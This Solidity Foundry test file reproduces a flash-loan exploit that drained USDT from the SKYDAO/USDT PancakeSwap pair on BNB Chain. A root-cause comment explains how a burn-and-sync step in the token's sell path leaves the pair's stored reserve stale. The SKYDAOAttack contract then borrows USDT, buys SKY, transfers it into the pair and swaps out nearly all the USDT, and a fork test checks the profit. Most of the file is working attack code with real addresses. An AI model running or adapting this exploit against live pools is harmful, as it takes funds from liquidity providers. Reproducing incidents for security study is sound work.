// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// SKYDAO (SKYDAO/USDT PancakeSwap V2) - burn-from-pair + premature sync() reserve mismatch - BNB Chain,
// 2026-09-30. Attacker nets 59,914.12 USDT; the pair loses its entire 183,482.88 USDT side.
//
// Exploit tx    : 0x8e3016674ea8e5d2ad3af422ae5328f5a1f448e6b5a93d5d773e358bd2e440eb (block 124921242,
//                 a contract-creation tx; the deployed contract's constructor ran the whole attack)
// Attacker EOA  : 0x5C9214d91eA1d2D6A46F80457c25a6e7e4D56EBc (receives the final 59,914.12 USDT)
// SKYDAO token  : 0x7eBa33c7a0e555D115277BA4Af04DFbB4F4Fa70c (verified; fee-on-transfer, pair token1)
// Pool controller: 0xEe5fDff6364dDe0A3C66dD38A4303cDd3D10730c (results[8]; UNVERIFIED, behaviour
//                 confirmed from the on-chain trace: sells the 35% tax, controlburns, syncs)
// SKYDAO/USDT pair: 0x096e08ddA1E18625fFdfBae4BB65a414Aa7eC2c8 (PancakeSwap V2, token0 = USDT)
// USDT          : 0x55d398326f99059fF775485246999027B3197955 (pair token0)
// PancakeSwap V2 router: 0x10ED43C718714eb63d5aA57B78B54704E256024E
// Moolah flash pool: 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C (fee-free; held exactly the borrowed amount)
//
// ROOT CAUSE (verified against the verified SKYDAO source + the on-chain trace):
// SKYDAO._transfer treats a transfer whose recipient is the pair as a sell. On a sell it taxes 35% to the
// pool controller and then, BEFORE crediting the seller's net tokens to the pair, hands the controller the
// GROSS amount and lets it mutate the pair (SKYDAO Contract.sol:243-270):
//
//     } else if (to == _uniswapV2Pair) {          // sell
//         tax = getTax(from, results);            // 35  (getTax returns 35 for any non-controller address)
//         sort = 2;
//     }
//     ...
//     if (tax > 0) {
//         uint256 taxAmount = (amount * tax) / 100;            // 35% of the gross sell
//         ... else {                                           // sort == 2 (sell)
//             _basicTransfer(from, results[8], taxAmount);     // 35% SKY -> controller
//             IPancakeFactory(results[8]).sellToken(amount, _swapLock);  // controller acts on the GROSS, now
//         }                                                    //   it sells the tax, then calls
//         amount -= taxAmount;                                 //   SKYDAO.controlburn(gross) which does
//     }                                                        //   _basicTransfer(pair -> dEaD, gross) and
//     _basicTransfer(from, to, amount);          // net 65% credited to the pair AFTER the controller synced
//
// controlburn (Contract.sol:285-293) is gated to the controller, but the gate protects nothing: the public
// sell path is what invokes it. The controller burns the pair's whole SKY balance to 0x..dEaD and calls
// pair.sync() while the seller's net SKY has NOT yet been credited, so the pair's STORED reserve1 (SKY) is
// latched at ~0. Immediately afterwards _transfer credits the net 65% SKY to the pair, so the pair's REAL
// SKY balance (~2.536e27) now hugely exceeds its stored reserve1. A direct pair.swap() then passes the K
// check against the stale ~0 reserve and lets the attacker pull the pair's entire USDT reserve out.
//
// The sell path has no owner/admin/signer gate (only the 35% tax). The buy path requires _swapLock, which
// flips to true automatically at the top of _transfer once totalHolder >= 200000 (Contract.sol:228-230), so
// a buy to an ordinary address goes through. Nothing the attacker calls is privileged.
//
// Attack flow, reconstructed below as real typed calls (not a bytecode/calldata replay):
//   1. Flash-borrow 2,656,932.603895 USDT from Moolah (fee-free; it held exactly this much).
//   2. Buy with 435,367.433949 USDT through the real PancakeSwap V2 router -> ~3.9015e27 SKY (after 35% buy tax).
//   3. SKYDAO.transfer(pair, <full SKY>): the sell path taxes 35% to the controller, the controller sells it,
//      controlburns the pair's SKY to dEaD and syncs (stored reserve1 -> ~0), then the net 65% is credited.
//   4. Direct pair.swap(reserve0 - 1, 0, self): the pair, reading its stale ~0 SKY reserve, pays out ~all of
//      its 495,281.556835 USDT against the net SKY the sell just deposited.
//   5. Repay the 2,656,932.603895 USDT flash; keep the surplus.
//
// Figures reconcile exactly: pair USDT in = 435,367.433949 (buy) + 92,676.5708 (controller refill); out =
// 216,245.3319 (tax sell) + 495,281.556835 (final drain); net -183,482.88 = the pair's entire starting USDT.
// Attacker: borrow 2,656,932.603895, hold the unused float, drain 495,281.556835, repay -> 59,914.122886 USDT.
//
// Moolah's flash loan uses transient storage, so this must run with cancun:
//   forge test --contracts src/test/2026-09/SKYDAO_exp.sol --evm-version cancun -vvv

interface IMoolah {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IMoolahFlashLoanCallback {
    function onMoolahFlashLoan(uint256 assets, bytes calldata data) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract SKYDAOAttack is IMoolahFlashLoanCallback {
    IMoolah internal constant MOOLAH = IMoolah(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);
    IPancakeRouter internal constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 internal constant SKY = IERC20(0x7eBa33c7a0e555D115277BA4Af04DFbB4F4Fa70c);
    IPancakePair internal constant PAIR = IPancakePair(0x096e08ddA1E18625fFdfBae4BB65a414Aa7eC2c8);

    // Exact on-chain sizing (wei).
    uint256 internal constant LOAN = 2_656_932_603_895_226_812_594_665; // 2,656,932.603895 USDT (all Moolah held)
    uint256 internal constant BUY = 435_367_433_949_137_634_279_573; // 435,367.433949 USDT spent on the buy

    function attack() external returns (uint256 profit) {
        MOOLAH.flashLoan(address(USDT), LOAN, "");
        profit = USDT.balanceOf(address(this)); // net USDT kept after repaying the flash loan
    }

    function onMoolahFlashLoan(uint256 assets, bytes calldata) external override {
        require(msg.sender == address(MOOLAH), "not moolah");

        // Step 2: buy SKYDAO through the real router (handles the 35% fee-on-transfer buy tax).
        USDT.approve(address(ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(SKY);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(BUY, 0, path, address(this), block.timestamp);

        // Step 3: sell by transferring the whole SKY stack into the pair. This triggers the controller's
        // tax-sell + controlburn + premature sync, then credits the net 65% to the pair - so the pair's real
        // SKY balance ends up far above its freshly-synced (~0) stored reserve.
        SKY.transfer(address(PAIR), SKY.balanceOf(address(this)));

        // Step 4: direct swap against the stale reserve. reserve0 (USDT) is still the full pair balance; the
        // net SKY the sell just deposited is the swap input, and the ~0 stored SKY reserve makes the K check
        // trivial, so we pull out essentially all of the pair's USDT.
        (uint112 reserve0,,) = PAIR.getReserves(); // token0 = USDT
        PAIR.swap(uint256(reserve0) - 1, 0, address(this), "");

        // Step 5: repay the fee-free flash loan (Moolah pulls `assets` via transferFrom).
        USDT.approve(address(MOOLAH), assets);
    }
}

contract SKYDAO_exp is BaseTestWithBalanceLog {
    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakePair internal constant PAIR = IPancakePair(0x096e08ddA1E18625fFdfBae4BB65a414Aa7eC2c8);
    SKYDAOAttack internal atk;

    uint256 internal constant FORK_BLOCK = 124_921_241; // parent of the exploit block 124921242
    uint256 internal constant EXPECTED_PROFIT = 59_914_122_886_306_033_123_041; // 59,914.122886 USDT
    uint256 internal constant EXPECTED_PAIR_LOSS = 183_482_883_991_401_873_856_912; // 183,482.883991 USDT

    function setUp() public {
        vm.createSelectFork("https://bsc-mainnet.public.blastapi.io", FORK_BLOCK);
        atk = new SKYDAOAttack();
        fundingToken = address(USDT);
        attacker = address(atk);
        vm.label(address(atk), "Attacker");
        vm.label(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C, "Moolah");
        vm.label(0x10ED43C718714eb63d5aA57B78B54704E256024E, "PancakeRouterV2");
        vm.label(0x096e08ddA1E18625fFdfBae4BB65a414Aa7eC2c8, "SKYDAO_USDT_Pair");
        vm.label(0x7eBa33c7a0e555D115277BA4Af04DFbB4F4Fa70c, "SKYDAO");
        vm.label(0xEe5fDff6364dDe0A3C66dD38A4303cDd3D10730c, "PoolController");
    }

    function testExploit() public balanceLog {
        assertEq(USDT.balanceOf(address(atk)), 0, "attacker already funded");

        uint256 pairUsdtBefore = USDT.balanceOf(address(PAIR));

        uint256 profit = atk.attack();

        uint256 pairUsdtAfter = USDT.balanceOf(address(PAIR));
        uint256 pairLoss = pairUsdtBefore - pairUsdtAfter;

        emit log_named_decimal_uint("attacker net USDT profit", profit, 18);
        emit log_named_decimal_uint("pair USDT loss          ", pairLoss, 18);

        // Both match the on-chain figures: 59,914.122886 USDT netted, 183,482.883991 USDT drained from the pair.
        assertApproxEqRel(profit, EXPECTED_PROFIT, 1e16, "profit off reported ~59,914.12 USDT");
        assertApproxEqRel(pairLoss, EXPECTED_PAIR_LOSS, 1e16, "pair loss off reported ~183,482.88 USDT");
    }
}
